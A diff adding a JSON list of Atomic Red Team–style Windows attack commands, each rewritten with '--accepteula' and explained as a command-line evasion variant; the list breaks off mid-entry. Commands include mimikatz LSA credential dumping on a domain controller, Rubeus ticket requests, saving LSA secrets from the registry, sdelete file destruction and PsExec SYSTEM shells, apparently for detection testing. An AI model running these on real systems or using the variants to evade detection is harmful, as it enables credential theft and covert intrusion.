@@ -1,0 +1,36 @@
+```json
+[
+  {
+    "output": "\"C:\\AtomicRedTeam\\ExternalPayloads\\PsExec.exe\" --accepteula \\\\localhost -w c:\\ -c C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\rubeus.exe asktgt /user:Administrator /password:Password /domain:THAIMX /outfile:ticket.kirbi",
+    "explanation": "Substituted '-accepteula' with '--accepteula' using long option substitution."
+  },
+  {
+    "output": "\"C:\\AtomicRedTeam\\ExternalPayloads\\Sdelete\\sdelete.exe\" --accepteula C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\T1485.txt",
+    "explanation": "Substituted '-accepteula' with '--accepteula' using long option substitution."
+  },
+  {
+    "output": "\"C:\\Users\\Public\\Temp\\PsExec.exe\" -i -s cmd --accepteula",
+    "explanation": "Substituted '-accepteula' with '--accepteula' using long option substitution."
+  },
+  {
+    "output": "\"C:\\WINDOWS\\system32\\cmd.exe\" /c \"C:\\Users\\thaim\\AppData\\Local\\Temp\\psexec.exe --accepteula \\\\THAIMX cmd.exe /c echo \" --access-token",
+    "explanation": "Substituted '-accepteula' with '--accepteula' using long option substitution."
+  },
+  {
+    "output": "\"cmd.exe\" /c \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\PsExec.exe\" --accepteula \\\\DC1 -c %tmp%\\mimikatz\\x64\\mimikatz.exe \"lsadump::lsa /inject /id:500\" \"exit\"",
+    "explanation": "Substituted '/accepteula' with '--accepteula' using long option substitution."
+  },
+  {
+    "output": "\"cmd.exe\" /c \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\PsExec.exe\" \\\\localhost --accepteula -c C:\\Windows\\System32\\cmd.exe",
+    "explanation": "Substituted '-accepteula' with '--accepteula' using long option substitution."
+  },
+  {
+    "output": "\"cmd.exe\" /c \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\PsExec.exe\" \\\\localhost -i -u DOMAIN\\Administrator -p P@ssw0rd1 --accepteula \"C:\\Windows\\System32\\calc.exe\"",
+    "explanation": "Substituted '-accepteula' with '--accepteula' using long option substitution."
+  },
+  {
+    "output": "\"cmd.exe\" /c \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\T1003.004\\bin\\PsExec.exe\" --accepteula -s reg save HKLM\\security\\policy\\secrets %temp%\\secrets /y",
+    "explanation": "Substituted '-accepteula' with '--accepteula' using long option substitution."
+  },
+  {
+    "output": "\"powershell.exe\" & {& \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\PsExec.exe\" --accepteula \\\\localhost -w c:\\ -c \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\rubeus.exe
